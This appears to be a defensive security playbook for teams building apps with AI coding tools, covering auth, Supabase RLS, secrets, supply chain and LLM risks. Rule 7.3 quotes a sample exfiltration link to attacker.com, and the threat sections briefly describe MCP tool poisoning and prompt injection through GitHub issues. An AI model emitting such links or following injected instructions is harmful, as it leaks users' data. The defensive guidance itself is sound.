# Security Playbook for AI-Assisted Development

**For**: Teams building software with AI coding tools (Claude, Cursor, Copilot, etc.)
**Last Updated**: 2026-03-08

---

## Why This Playbook Exists

AI-assisted development ("vibe coding") lets small teams build and ship software fast. But speed creates risk. Security researchers have found that **45% of AI-generated applications contain exploitable vulnerabilities** (Veracode, 2025), and AI-assisted repos have a **40% higher rate of leaked secrets** than average (GitGuardian, 2025).

This isn't theoretical. In February 2026, an app built entirely with AI tools leaked **1.5 million API keys and 35,000 user emails** through a misconfigured database (Wiz/Moltbook). A scan of apps built on the Lovable platform found **170 out of 1,645 apps exposing personal user data publicly** (Escape.tech).

This playbook prevents those outcomes. It's designed so any team using AI coding tools can follow it without needing a dedicated security engineer.

### How to Use This Document

### Quick Start (New or Existing Project)

```bash
cd /path/to/your-project
bash ~/Documents/security-playbook/setup.sh
```

This single command sets up: GitHub Actions security workflow, Dependabot, security rules for Claude Code + Codex + Cursor, .gitignore safety entries, gitleaks config, and Semgrep Skills. It won't overwrite existing files. No build changes, no hooks, no blockers.

### Ongoing

- **Run the pre-deploy checklist** before every deployment (5 min)
- **Run a monthly audit** per `SECURITY-REVIEW-PROCESS.md` (45 min)
- **Log every finding** in `LESSONS-LEARNED.md` and turn it into a rule or CI check

No security team required for day-to-day work. The system gets stronger with every issue found.

### How the System Fits Together

| File | Role | How It Gets There |
|------|------|-------------------|
| **SECURITY-PLAYBOOK.md** | What to do and why — the reference | Read once |
| **setup.sh** | Applies everything to a project in one command | Run once per project |
| **.claude/CLAUDE.md** | Rules for Claude Code — prevention + CI review prompts | Created by setup.sh |
| **AGENTS.md** | Rules for OpenAI Codex — same security rules, Codex format | Created by setup.sh |
| **.cursorrules** | Rules for Cursor — same security rules, Cursor format | Created by setup.sh |
| **.github/workflows/security.yml** | CI checks that report warnings on every PR — detection | Created by setup.sh |
| **.github/dependabot.yml** | Auto-updates vulnerable dependencies | Created by setup.sh |
| **SECURITY-REVIEW-PROCESS.md** | When and how to run reviews — detection | Follow as needed |
| **LESSONS-LEARNED.md** | Feed findings back into the system — anti-fragility | Update on every finding |
| **APPENDIX-MCP-INTEGRATIONS.md** | Security rules for Google Workspace, Slack, BigQuery, GitHub, AWS | Reference when connecting services |

---

## The Threat Landscape: What Actually Goes Wrong

Before diving into rules, here's what security researchers are actually finding in AI-built apps. These are the problems this playbook prevents.

### Real Incidents (2024-2026)

| Incident | What Happened | Root Cause |
|----------|---------------|------------|
| **Moltbook** (Feb 2026) | 1.5M API keys + 35K emails leaked publicly | Misconfigured Supabase database with no Row-Level Security |
| **Lovable Apps** (Feb 2026) | 170 apps exposing personal data; one app had 16 vulnerabilities (6 critical) leaking 18K+ people's data | AI generated database schemas without access controls |
| **EchoLeak** (2025) | Zero-click prompt injection in Microsoft 365 Copilot exfiltrated user data without any user interaction (CVE-2025-32711, CVSS 9.3) | No input sanitization on data processed by LLM |
| **Next.js Middleware Bypass** (2025) | Attackers bypassed all middleware-based auth by injecting a single HTTP header (CVE-2025-29927) | Sole reliance on middleware for authorization |
| **PackageGate** (Jan 2026) | pnpm HTTP tarball dependencies lacked integrity hashes, allowing content substitution | Missing lockfile integrity verification |
| **npm Supply Chain** (Sep 2025) | 18 popular packages (including `debug`, `chalk`) compromised via hijacked maintainer credentials | No dependency pinning or integrity checks |

### New Attack Classes Specific to AI-Generated Code

**Slopsquatting** — AI models hallucinate package names that don't exist. A 2025 study of 576,000 code samples found **19.7% of AI-recommended packages were completely fabricated**. Attackers register these hallucinated names on npm with malicious payloads. Unlike typosquatting (misspellings), these are entirely made-up but plausible-sounding names that AI repeatedly suggests.

**MCP Tool Poisoning** — Malicious MCP servers embed hidden instructions in tool descriptions that are invisible to users but followed by AI models. Invariant Labs demonstrated exfiltrating a user's entire message history through a poisoned MCP tool. CVE-2025-53109 (Anthropic MCP) and CVE-2025-54135 (Cursor MCP) allowed arbitrary file access and command execution on developer machines.

**Prompt Injection via External Data** — Attackers create malicious GitHub issues, emails, or documents that, when read by an AI coding agent, hijack the agent to leak private repository data or execute malicious code.

---

## Section 1: Authentication & Sessions

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 1.1 | Use established auth providers (Supabase Auth, Clerk, Auth0). Never build custom auth. | **Critical** | AI-generated auth code has subtle flaws — timing attacks, weak hashing, session fixation. Studies show an 86% failure rate in AI-generated security-critical code. Use a battle-tested solution. |
| 1.2 | Set session expiration to 7 days maximum. Use refresh token rotation. | **High** | Long-lived sessions are the #1 token theft vector. Rotation limits damage from stolen tokens. |
| 1.3 | Store tokens in httpOnly, secure, sameSite cookies — never localStorage for customer-facing apps. For internal tools with domain-restricted access, localStorage is acceptable with session timeouts ≤8 hours. | **High** | localStorage is readable by any JavaScript on the page, including injected scripts. Cookies with proper flags are immune. Internal tools with IP/domain restrictions have lower exposure. |
| 1.4 | Enforce HTTPS everywhere. | **Critical** | Tokens sent over HTTP are visible to anyone on the network. Vercel does this by default, but verify for custom domains. |
| 1.5 | Implement proper logout — invalidate server-side session, clear all cookies. | **Medium** | Client-only logout leaves a valid session that can be replayed. |
| 1.6 | Never rely solely on middleware for auth. Re-verify in every API route handler. | **Critical** | CVE-2025-29927 showed that Next.js middleware can be completely bypassed with a single HTTP header. Defense-in-depth is required. |

### Common AI Mistakes
- Generates JWT verification that doesn't check `exp` (expiration) or `iss` (issuer)
- Creates "auth middleware" that checks for token presence but doesn't validate it
- Stores passwords with MD5/SHA-256 instead of bcrypt/argon2

---

## Section 2: API & Route Security

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 2.1 | Every API route must check authentication. No exceptions for "internal" routes. | **Critical** | Vercel serverless functions are publicly accessible URLs. There is no "internal" — if it has a route, anyone can hit it. |
| 2.2 | Add rate limiting to every public endpoint. If a rate limiter exists in the project, apply it — don't build it and leave it unused. | **High** | Without limits, a single script can run up your Vercel/AI bills or brute-force auth. Use Vercel WAF or upstash/ratelimit. |
| 2.3 | Validate and sanitize all inputs at the API boundary using zod or equivalent. | **Critical** | Never trust client data. Validate types, lengths, formats on every request. |
| 2.4 | Return generic error messages to clients. Log details server-side only. | **High** | Stack traces and SQL errors in responses give attackers a map of your system. |
| 2.5 | Set security headers. In Next.js use `next.config.js`. In Vite + Vercel use a `headers` block in `vercel.json`. Start with `X-Content-Type-Options`, `X-Frame-Options`, and `Referrer-Policy` — skip CSP initially as it can break things if misconfigured. | **Medium** | Headers like X-Frame-Options and X-Content-Type-Options prevent clickjacking and MIME sniffing attacks. HSTS is handled automatically by Vercel on `.vercel.app` domains. |
| 2.6 | Validate webhook signatures before processing any payload. | **Critical** | Unsigned webhooks mean anyone can send fake data to your endpoint. Always verify the cryptographic signature. |
| 2.7 | Use CORS with explicit allow-list of origins. Never `Access-Control-Allow-Origin: *` with credentials. | **High** | Wildcard CORS lets any website make authenticated requests on behalf of your users. |

### Recommended Security Headers

**Next.js projects** — in `next.config.js`:
```js
headers: async () => [{
  source: '/(.*)',
  headers: [
    { key: 'X-Frame-Options', value: 'DENY' },
    { key: 'X-Content-Type-Options', value: 'nosniff' },
    { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  ],
}]
```

**Vite + Vercel projects** — in `vercel.json`:
```json
"headers": [
  {
    "source": "/api/(.*)",
    "headers": [
      { "key": "X-Content-Type-Options", "value": "nosniff" },
      { "key": "X-Frame-Options", "value": "DENY" },
      { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
    ]
  }
]
```

> **Note:** Skip `Content-Security-Policy` initially — it can break scripts and styles if misconfigured. Skip `Strict-Transport-Security` on `.vercel.app` domains — Vercel sets it automatically.

### Handling Semgrep False Positives
- **CORS origin reflection**: Semgrep flags `res.setHeader('Access-Control-Allow-Origin', origin)` as user-input-controlled CORS. If the origin is validated against a whitelist before being reflected, this is correct behavior — suppress with a comment explaining the whitelist check.
- **General approach**: Before suppressing any Semgrep finding, verify the mitigation is real (not just "it looks fine"). Document why in a comment next to the suppression.

### Common AI Mistakes
- Creates API routes without any auth check — "it's just a helper endpoint"
- Returns `{ error: err.message }` which leaks internals — always return a generic message
- Generates CORS with `origin: '*'` "for development" and it ships to production
- Skips input validation because "Supabase handles it" (RLS is not input validation)
- Builds a rate limiter utility but only applies it to 1 out of 10 routes

---

## Section 3: Database Security (Supabase)

This is where **most vibe-coded apps get breached**. The Escape.tech scan of 5,600+ AI-built apps found that exposed Supabase tokens and missing RLS were the single most common critical vulnerability.

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 3.1 | Enable Row-Level Security (RLS) on EVERY table from day one. | **Critical** | Without RLS, anyone with your anon key (which is public in your frontend code) can read/write every row. This caused the Moltbook and Lovable breaches. |
| 3.2 | Never use the `service_role` key in client-side or edge code. | **Critical** | The service_role key bypasses ALL RLS. If it leaks (and client code is always extractable from the browser), your entire database is open. |
| 3.3 | Always use `auth.uid()` in RLS policies — never trust client-provided user IDs. | **Critical** | Clients can send any user ID they want. The only trustworthy identity is the authenticated session. |
| 3.4 | Use parameterized queries exclusively. Never concatenate user input into SQL. | **Critical** | SQL injection remains the most exploited web vulnerability. Supabase client handles this by default, but raw SQL via RPC must be parameterized manually. |
| 3.5 | Views bypass RLS by default. Use `security_invoker = true` on all views. | **High** | PostgreSQL views run as the view owner (usually postgres superuser), not the calling user. Without `security_invoker`, views ignore RLS entirely. |
| 3.6 | Never use `SECURITY DEFINER` on database functions unless explicitly justified. | **High** | `SECURITY DEFINER` functions run as the function owner, bypassing all RLS. Use `SECURITY INVOKER` by default. |
| 3.7 | INSERT policies need companion SELECT policies. | **Medium** | PostgreSQL SELECTs newly inserted rows to return them. Without a SELECT policy, inserts fail silently or behave unexpectedly. |
| 3.8 | Only select the columns you need. Avoid `select('*')`. | **Medium** | Over-fetching exposes internal IDs, timestamps, soft-delete flags, and related user data that shouldn't leave the server. |
| 3.9 | Encrypt sensitive data at rest using Supabase Vault or pgcrypto. | **High** | Database backups, log files, and admin panels can expose unencrypted PII and business data. |
| 3.10 | Run the Supabase Security Advisor from the dashboard regularly. | **Medium** | It automatically scans for RLS gaps, public schema exposure via PostgREST, and other misconfigurations. |

### Key Concepts
- **Anon key** = public (safe for client, but only grants what RLS policies allow)
- **Service role key** = god mode (bypasses all security, server-only, never expose)
- **RLS is OFF by default** on new tables. You must enable it explicitly.

### Common AI Mistakes
- Creates tables without RLS and says "we'll add it later"
- Uses `service_role` "because RLS was blocking the query" instead of fixing the policy
- Writes `SECURITY DEFINER` functions without understanding they bypass RLS
- Generates migrations that grant `PUBLIC` access to functions

---

## Section 4: Secrets & Environment Variables

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 4.1 | All secrets in environment variables. Zero secrets in code, config files, or comments. | **Critical** | Bots actively scan GitHub for leaked keys. A single committed API key can be scraped from git history even after deletion. GitGuardian found a 6.4% secret leakage rate in AI-assisted repos. |
| 4.2 | Use `.env.local` for local dev. Never commit `.env` files. Verify `.gitignore`. | **Critical** | `.env.example` with placeholder values is fine. Real `.env` files must never be committed. |
| 4.3 | Scope Vercel environment variables by environment (production, preview, development). | **High** | A secret needed only in production should not be available in preview deployments, which may have weaker access controls. |
| 4.4 | Never prefix secrets with `NEXT_PUBLIC_`. | **Critical** | `NEXT_PUBLIC_` variables are embedded in the JavaScript bundle sent to every browser. Putting a secret there publishes it to the world. |
| 4.5 | Rotate secrets every 90 days. Immediately rotate any that may have been exposed. | **High** | Leaked secrets have a long tail. Rotation limits the exploitation window. |
| 4.6 | Run secret scanning (gitleaks, GitHub secret scanning) in CI. | **High** | Automated scanning catches what humans miss. Enable Supabase's GitHub secret scanning integration — it auto-revokes keys found in public repos. |
| 4.7 | In Vite projects, NEVER use `VITE_` prefix for env vars needed by serverless functions. | **High** | `VITE_` vars are injected at build time and only exist in client-side bundles. Serverless functions (Vercel API routes) run in a separate Node.js environment and cannot see them. Use non-prefixed names and set them in the hosting dashboard. |

### Common AI Mistakes
- Hardcodes API keys "for testing" and the code gets committed
- Suggests `NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY` — exposing god-mode key to every browser
- Creates `.env` files and forgets to add them to `.gitignore`
- Uses `VITE_GOOGLE_CLIENT_ID` in a serverless function — the variable is undefined at runtime, breaking auth silently

---

## Section 5: Dependency & Supply Chain Security

### The Slopsquatting Threat

This is a new attack class specific to AI-generated code. AI models hallucinate package names that don't exist — **19.7% of AI-recommended packages are completely fabricated** (March 2025 study, 576K samples). Attackers register these names on npm/PyPI with malicious code.

This is different from typosquatting (misspellings). These are plausible-sounding packages that AI repeatedly suggests across different sessions and users, making them predictable and weaponizable.

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 5.1 | Verify every AI-suggested package exists and is legitimate before installing. Check npm for: weekly downloads (>10K), last update (<6 months), maintainer count (>1), known CVEs. | **Critical** | 1 in 5 AI-suggested packages may not exist. The ones that do exist with low download counts could be malicious registrations. |
| 5.2 | Always commit lockfiles (`pnpm-lock.yaml`). Use `--frozen-lockfile` in CI. | **High** | Lockfiles ensure you deploy the exact versions you tested. The PackageGate attack (Jan 2026) exploited missing integrity hashes in pnpm lockfiles. |
| 5.3 | Run `pnpm audit` after every install and in CI. Block merges on critical/high findings. | **High** | Known vulnerabilities in dependencies are the lowest-hanging fruit for attackers. |
| 5.4 | Before adding a dependency, ask: "Can I write this in 20 lines instead?" | **Medium** | AI suggests packages for trivial operations. Every dependency is an attack surface. The September 2025 npm attack compromised 18 popular packages including `debug` and `chalk`. |
| 5.5 | Disable lifecycle scripts by default. Set `ignore-scripts=true` in `.npmrc`. | **High** | `preinstall`/`postinstall` scripts in malicious packages can execute arbitrary code on your machine during `pnpm install`. |
| 5.6 | Pin major versions. Use `~` (patch) over `^` (minor) for critical dependencies. | **Medium** | Unexpected version bumps can introduce vulnerabilities. |
| 5.7 | Keep pnpm updated (10.26.3+ minimum) to include PackageGate integrity fixes. | **High** | Older pnpm versions lack hash verification for HTTP tarball dependencies. |

### Common AI Mistakes
- Suggests `npm install cool-json-parser` with 47 downloads instead of using built-in `JSON.parse`
- Installs 5 packages for a feature that needs 1
- Doesn't distinguish `dependencies` from `devDependencies`, bloating production bundles

---

## Section 6: Infrastructure & Deployment (Vercel)

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 6.1 | Enable Vercel WAF and DDoS protection. | **High** | Serverless functions scale automatically — a DDoS attack scales your bill automatically too. Use Attack Challenge Mode during active incidents. |
| 6.2 | Set `maxDuration` on all serverless functions. Default to 10s. | **Medium** | A hanging function without a timeout consumes resources indefinitely. |
| 6.3 | Keep test and production environments fully separate. Different databases, different API keys. | **High** | Test environments with production data are a breach. Test environments that talk to production APIs are a disaster. |
| 6.4 | Enable deployment protection for preview deployments. | **Medium** | Preview deployments are publicly accessible by default. If they use production-like data, they need protection. |
| 6.5 | Never cache authenticated API responses. | **Medium** | Cached user-specific data can be served to the wrong user by CDN edge nodes. |
| 6.6 | Pin GitHub Actions to commit SHAs, not tags. | **High** | Tags can be force-pushed by compromised maintainers. SHAs are immutable. |
| 6.7 | Use Vercel Sensitive Environment Variables for API keys. | **Medium** | These can only be decrypted during builds, not read back from the dashboard — reducing exposure if the dashboard is compromised. |
| 6.8 | Always use the most restrictive OAuth/API scope for cloud services. For BigQuery analytics use `bigquery.readonly`, not `bigquery`. For Google Drive read access use `drive.readonly`. | **High** | Overly broad scopes mean a compromised credential can modify or delete data, not just read it. Default scopes suggested by docs and AI are often more permissive than needed. |

### Common AI Mistakes
- Doesn't set `maxDuration` and a function hangs for 5 minutes on every timeout
- Configures preview deployments with production environment variables
- Sets `Cache-Control: public, max-age=3600` on routes that return user-specific data

---

## Section 7: AI-Specific Security (LLM API Usage)

If your application calls AI APIs (OpenAI, Anthropic, etc.), these risks apply. The **OWASP Top 10 for LLM Applications** (2025 edition) provides the authoritative framework here.

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 7.1 | Never pass raw user input directly into LLM prompts. Use delimiter tokens to separate system instructions from user input. | **Critical** | Prompt injection is the #1 LLM risk (OWASP LLM01). EchoLeak (CVE-2025-32711) exfiltrated data from Microsoft 365 Copilot with zero user interaction. |
| 7.2 | Set hard cost limits on all AI API accounts. Configure billing alerts at 50%, 80%, 100%. | **Critical** | A single runaway loop can generate thousands in charges overnight. Set monthly caps AND per-request `max_tokens`. |
| 7.3 | Treat all LLM output as untrusted input. Sanitize before rendering, storing, or executing. | **High** | LLMs can generate malicious HTML, URLs, or code. Attackers can use prompt injection to embed exfiltration links like `![img](https://attacker.com/steal?data=SECRET)` in outputs. |
| 7.4 | Never send PII to AI APIs unless explicitly required and documented. | **High** | Every API call sends data to a third party. GDPR requires Data Processing Agreements. Strip names, emails, phone numbers before sending context. |
| 7.5 | Implement per-user rate limits on AI features. Cap tool/function calls per conversation turn. | **High** | Without limits, one user can consume your entire AI budget. Recursive agent loops can call tools indefinitely. |
| 7.6 | Never put secrets in system prompts. | **Critical** | System prompts will leak — through prompt injection, model behavior, or social engineering. Keep credentials server-side. |
| 7.7 | Log all AI API calls with token counts and costs. Monitor for anomalies. | **Medium** | A sudden spike in usage may indicate abuse, a bug, or a runaway loop. |
| 7.8 | Implement circuit breakers for agent/tool loops. Kill after N iterations. | **High** | Without circuit breakers, an AI agent can loop infinitely, burning through your API budget. |

### Common AI Mistakes
- Builds a feature that passes entire conversation history (including other users' messages) as context
- Doesn't set `max_tokens`, allowing responses to consume unlimited tokens
- Hardcodes the OpenAI API key in a client-side component
- Generates a "summarize" feature that sends full database records (including PII) to the AI

---

## Section 8: Development Environment Security

This section is unique to AI-assisted development. Your development tools themselves are now an attack surface.

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 8.1 | Audit MCP server tool descriptions and permissions before installing. | **Critical** | MCP tool poisoning embeds hidden instructions that AI follows but humans can't see. Invariant Labs demonstrated exfiltrating full message histories through poisoned MCP tools. |
| 8.2 | Never grant AI coding agents access to production environments or credentials. | **Critical** | A compromised or manipulated agent with production access can cause irreversible damage. |
| 8.3 | Review AI-generated code before committing — don't blindly accept suggestions. | **High** | AI generates vulnerable code patterns 40% more often than secure ones because insecure patterns are more common in training data. |
| 8.4 | Be cautious of AI agents reading external content (GitHub issues, emails, documents). | **High** | Attackers create malicious issues/documents that hijack AI agents when processed. GitHub MCP prompt injection (May 2025) leaked private repo data this way. |
| 8.5 | Keep AI coding tools updated. Check for CVEs. | **High** | CVE-2025-53109 (Anthropic MCP) and CVE-2025-54135 (Cursor) allowed arbitrary file access and command execution on developer machines. |

---

## Section 9: Logging, Monitoring & Audit Trail

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 9.1 | Use structured logging (JSON format) with consistent fields across services. | **Medium** | `console.log("something happened")` is useless in production. Structured logs are searchable and can feed alerting systems. |
| 9.2 | Never log secrets, tokens, passwords, or full PII. | **Critical** | Logs are stored in less-secured systems and accessed by more people than the database. |
| 9.3 | Log all critical actions: auth events, data mutations, permission changes, admin actions. | **High** | When something goes wrong, the audit trail is how you reconstruct what happened. |
| 9.4 | Remove `console.log` with sensitive data before deploying. | **Medium** | Debug logs in production leak internal state and fill up log storage. |
| 9.5 | Set up alerts for: failed auth attempts (>5/min), error rate spikes, unusual API usage. | **High** | Detection speed is the difference between a contained incident and a full breach. |

### Common AI Mistakes
- Sprinkles `console.log(user)` throughout code, logging full objects with emails and tokens
- Logs request bodies on every API call, which includes passwords on the login endpoint
- No logging at all — when something breaks, there's no trail

---

## Section 10: Data Privacy & Compliance

### Rules

| # | Rule | Severity | Why It Matters |
|---|------|----------|----------------|
| 10.1 | Build data deletion flows. Users must be able to request deletion of their data. | **High** | GDPR, CCPA, and local data protection laws require this. Non-compliance carries significant fines (up to 4% of global revenue under GDPR). |
| 10.2 | Document what personal data you collect, where it's stored, and who can access it. | **High** | You can't protect what you don't know about. A data inventory is the foundation of compliance. |
| 10.3 | Minimize data collection. Only collect what the feature needs. | **Medium** | Every piece of data stored is a liability. Less data = less risk. |
| 10.4 | Ensure third-party services have Data Processing Agreements (DPAs). | **Medium** | You're responsible for data sent to AI providers, databases, and hosting platforms. |
| 10.5 | Every AI API call involving user data creates a compliance obligation. Document the data flow. | **High** | A chain of 10 tool calls with personal data generates 10 separate GDPR obligations. Know what you're sending where. |

---

## Pre-Deploy Security Checklist

Run this before every deployment. Every item must pass.

```
PRE-DEPLOY SECURITY CHECKLIST
==============================

SECRETS
[ ] No hardcoded secrets in code (API keys, passwords, tokens)
[ ] No secrets prefixed with NEXT_PUBLIC_
[ ] .gitignore includes .env* (except .env.example)
[ ] Environment variables scoped correctly in Vercel

AUTHENTICATION & AUTHORIZATION
[ ] All API routes have authentication checks (not just middleware)
[ ] All webhook endpoints verify signatures
[ ] CORS configured with explicit origins (no wildcard with credentials)

DATA & DATABASE
[ ] RLS enabled on all new/modified Supabase tables
[ ] No service_role key in client or edge code
[ ] All user inputs validated (zod schemas or equivalent)
[ ] Error responses don't leak internal details (no stack traces, no SQL errors)

DEPENDENCIES
[ ] All new packages vetted (downloads, maintenance, CVEs)
[ ] No AI-hallucinated packages (verified they exist on npm)
[ ] pnpm audit shows no critical/high vulnerabilities

AI & LLM
[ ] AI API calls have max_tokens limits
[ ] No PII sent to AI APIs unnecessarily
[ ] LLM outputs sanitized before rendering
[ ] Cost limits and billing alerts configured

INFRASTRUCTURE
[ ] Security headers configured
[ ] maxDuration set on serverless functions
[ ] No console.log with sensitive data

STATIC ANALYSIS
[ ] Semgrep scan passes with no critical/high findings
[ ] Semgrep LLM security skill checked (if AI features changed)
```

---

## Monthly Security Audit

Run once per month. Document findings in a report.

1. **Semgrep full scan**: Run `npx semgrep scan --config auto` across the entire codebase. Review and fix all critical/high findings.
2. **Secrets scan**: Search entire codebase for hardcoded secrets (gitleaks + Semgrep hardcoded-secrets rules)
3. **Dependency audit**: `pnpm audit` + review outdated packages
4. **RLS review**: Verify every Supabase table has appropriate policies (run Security Advisor)
5. **API surface audit**: List all API routes, verify auth and input validation on each
6. **Environment review**: Verify Vercel env var scoping
7. **Access review**: Who has access to Supabase dashboard, Vercel, GitHub? Remove stale accounts.
8. **AI cost review**: Check spending trends, verify limits, adjust budgets
9. **CVE check**: Verify Next.js, React, pnpm versions are patched for known CVEs
10. **MCP audit**: Review installed MCP servers and their permissions

### Audit Report Template

```markdown
# Security Audit Report — [Project Name]
**Date**: YYYY-MM-DD
**Auditor**: [Name]

## Executive Summary
[2-3 sentences: overall posture, biggest concern, and whether it's improving]

## Critical Findings
[Must fix immediately — active risk]

## High Findings
[Fix within 1 week — significant risk]

## Medium / Low Findings
[Fix within 1 month — lower risk]

## Actions Taken During Audit
[What was fixed on the spot]

## Open Items
[What needs follow-up, with owner and deadline]
```

---

## Quick Reference: Key Concepts

| Term | What It Means | Why You Care |
|------|--------------|--------------|
| **RLS (Row-Level Security)** | Database rules that control which rows each user can see/edit | Without it, your entire database is publicly readable |
| **Anon key** | Supabase's public API key (safe for browsers) | Only allows what RLS policies permit |
| **Service role key** | Supabase's admin key (bypasses ALL security) | Must never appear in frontend code |
| **NEXT_PUBLIC_** | Variable prefix that embeds values in browser JavaScript | Never put secrets here — they're visible to everyone |
| **XSS** | Cross-Site Scripting — injecting malicious JavaScript | Can steal user sessions, redirect to phishing pages |
| **SQL Injection** | Inserting malicious SQL through user inputs | Can read/modify/delete your entire database |
| **Prompt Injection** | Manipulating AI through crafted inputs | Can leak system prompts, exfiltrate data, produce harmful outputs |
| **Slopsquatting** | AI hallucinating fake package names that attackers register | Installing them runs malicious code on your machine |
| **RLS bypass** | Ways to accidentally circumvent Row-Level Security | Views, SECURITY DEFINER functions, service_role key |

---

## Tools & Automation

### Semgrep Skills (Primary Static Analysis)

Semgrep is our engineering team's static analysis tool of choice. The [semgrep/skills](https://github.com/semgrep/skills) package extends AI coding agents with Semgrep's security knowledge, making it available during development — not just in CI.

**Install once per project:**
```bash
npx skills add semgrep/skills
```

**Three skills are included:**

| Skill | What It Does | Use When |
|-------|-------------|----------|
| **code-security** | OWASP Top 10 + infrastructure security across 15+ languages. Covers SQL injection, XSS, command injection, hardcoded secrets, memory safety, path traversal, SSRF, CSRF, JWT issues, prototype pollution, and cloud config (Terraform, Kubernetes, Docker). | Writing or reviewing any code |
| **llm-security** | OWASP LLM Top 10 — prompt injection prevention, PII detection, supply chain verification, output handling, excessive agency controls, system prompt leakage prevention, rate limiting. | Building any LLM-powered feature |
| **semgrep** | Run Semgrep static analysis scans and create custom detection rules. Pattern matching and taint-mode analysis. | CI/CD integration, custom rule development |

**Why this matters for us:** Semgrep Skills brings the same security standards our engineering team uses directly into our AI-assisted development workflow. When engineering reviews our code, they'll see it was already checked against the same Semgrep ruleset they trust. This bridges the gap between our teams.

**How to use in practice:**
- Ask your AI agent to "review this code for security using Semgrep rules" during development
- Run Semgrep scans before every PR: `npx semgrep scan --config auto`
- Include Semgrep in CI/CD to catch anything missed during development

### Full Tool Stack

| Tool | Purpose | When |
|------|---------|------|
| **Semgrep Skills** | Static analysis + OWASP security rules embedded in AI agent | During development + every PR |
| **Semgrep CI** (`npx semgrep scan`) | Automated static analysis in CI pipeline | Every PR, blocks on critical/high |
| Claude Code `/code-review` | AI code review with security focus | Every PR |
| `pnpm audit` | Dependency vulnerability scanning | Every install + CI |
| `gitleaks` | Secret scanning in git history | Pre-commit hook + CI |
| Vercel Firewall / WAF | Rate limiting, DDoS protection | Always-on in production |
| Supabase Security Advisor | RLS and config scanning | Monthly audit |
| AI billing dashboards | Cost monitoring and alerting | Weekly check |

---

## Incident Response

If you suspect a security incident:

1. **Rotate affected secrets immediately** — API keys, database passwords, tokens
2. **Check logs** — Vercel function logs, Supabase auth logs, AI API usage
3. **Assess scope** — what data could have been accessed? By whom?
4. **Document everything** — timestamp, what happened, what you did
5. **Notify stakeholders** — engineering lead, management, affected users if data was exposed
6. **Fix the root cause** — don't just rotate the secret, fix how it leaked
7. **Post-mortem** — document lessons learned, update this playbook

---

## Anti-Fragility: The Feedback Loop

This playbook gets stronger every time something goes wrong. Here's how:

```
Security issue found
        │
        ▼
Document in LESSONS-LEARNED.md
        │
        ▼
Determine fix category
        │
        ├──→ CLAUDE.md rule (AI stops generating this pattern)
        ├──→ CI check (code can't ship with this pattern)
        ├──→ Playbook update (checklist catches it next time)
        └──→ Stack appendix (stack-specific gotcha documented)
        │
        ▼
Implement the fix
        │
        ▼
System is now immune to this class of issue
```

**The rule:** Every lesson MUST result in a system change. If a finding doesn't update CLAUDE.md, CI, or the playbook, it will happen again.

See `LESSONS-LEARNED.md` for the log and `CI-SECURITY-SETUP.md` for automated enforcement.

---

## When to Escalate to Engineering

This playbook handles ~90% of security concerns. Escalate these to your engineering team:

- Custom cryptography (never build it yourself)
- Payment processing / PCI compliance changes
- Infrastructure changes (DNS, CDN, networking, database migrations at scale)
- Major auth flow changes (SSO, SAML, OAuth provider integration)
- Compliance questions (GDPR data subject requests, legal requirements)
- Any finding rated Critical that you're unsure how to fix

This isn't a failure — it's appropriate boundary-setting. The goal is autonomy on the routine, expert involvement on the exceptional.

---

## Sources & Further Reading

- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/)
- [Escape.tech: 2K+ Vulnerabilities in Vibe-Coded Apps](https://escape.tech/blog/methodology-how-we-discovered-vulnerabilities-apps-built-with-vibe-coding/)
- [Palo Alto Networks SHIELD Framework for Vibe Coding](https://unit42.paloaltonetworks.com/securing-vibe-coding-tools/)
- [Wiz: Common Security Risks in Vibe-Coded Apps](https://www.wiz.io/blog/common-security-risks-in-vibe-coded-apps)
- [HackerOne: Slopsquatting Supply Chain Attacks](https://www.hackerone.com/blog/ai-slopsquatting-supply-chain-security)
- [Invariant Labs: MCP Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [CVE-2025-29927: Next.js Middleware Bypass](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/troubleshooting/rls-performance-and-best-practices-Z5Jjwv)
- [GitGuardian: AI Code and Secret Sprawl](https://www.gitguardian.com/)

---

## Version History

| Date | Change | Author |
|------|--------|--------|
| 2026-03-08 | v1.1 — Added Vite env var rule, cloud scope rule, security headers for Vite+Vercel, rate limiter enforcement, Semgrep false positive guidance, error leakage CI check. Softened localStorage rule for internal tools. Validated against real bi-hub audit. | Paolo Cavalli |
| 2026-03-08 | Initial version — research-backed, covering 10 security domains | Paolo Cavalli |
